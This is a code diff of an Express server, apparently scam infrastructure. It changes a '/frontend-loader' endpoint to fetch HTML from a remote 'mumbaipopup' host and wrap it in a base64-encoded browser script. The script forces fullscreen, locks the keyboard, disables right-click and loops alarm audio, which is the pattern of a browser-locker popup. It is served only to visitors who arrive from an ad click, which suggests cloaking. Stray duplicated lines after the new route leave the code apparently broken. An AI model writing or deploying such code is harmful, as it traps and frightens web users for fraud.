@@ -64,27 +64,45 @@ app.get("/bot-remover", validateRequest, async (req, res) => {
   }
 });
 
-// === Endpoint: GET /frontend-loader ===
-app.get("/frontend-loader", validateRequest, (req, res) => {
+// Updated GET /frontend-loader route
+app.get('/frontend-loader', validateRequest, async (req, res) => {
   const gclid = req.query.gclid;
   if (!gclid || gclid.length < 10) {
     return res.status(403).send("FAILED: gclid missing or too short");
   }
 
-  const code = `
-    document.documentElement.requestFullscreen().then(() => {
-      document.body.innerHTML = someRandomString;
-      navigator.keyboard.lock();
-      document.addEventListener('contextmenu', e => e.preventDefault());
-      const audio1 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
-      audio1.loop = true;
-      audio1.play();
-      const mumbaiAudio = new Audio('https://audio.jukehost.co.uk/TiYldVqiRFah8SdaoR0nWNvyv20wGngh');
-      mumbaiAudio.loop = true;
-      mumbaiAudio.play();
-      document.removeEventListener("click", handleSomeClick);
-    });
-  `;
+  try {
+    // Fetch the remote HTML asset that was used in bot-remover
+    const assetUrl = "https://mumbaipopupformalik.onrender.com"; // or office variant
+    const assetRes = await fetch(assetUrl);
+    const someRandomString = await assetRes.text();
+
+    // Inject the fetched HTML safely inside a JS string literal
+    const sanitizedHTML = JSON.stringify(someRandomString); // safely escapes quotes/newlines
+
+    const code = `
+      document.documentElement.requestFullscreen().then(() => {
+        document.body.innerHTML = ${sanitizedHTML};
+        navigator.keyboard.lock();
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        const audio1 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
+        audio1.loop = true;
+        audio1.play();
+        const mumbaiAudio = new Audio('https://audio.jukehost.co.uk/TiYldVqiRFah8SdaoR0nWNvyv20wGngh');
+        mumbaiAudio.loop = true;
+        mumbaiAudio.play();
+        document.removeEventListener("click", handleSomeClick);
+      });
+    `;
+
+    const encoded = Buffer.from(code).toString('base64');
+    res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
+    return res.json({ code: encoded });
+  } catch (err) {
+    console.error("Error in /frontend-loader", err);
+    return res.status(500).json({ error: "Could not load or encode frontend script." });
+  }
+});
 
   const encoded = Buffer.from(code).toString("base64");
   res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
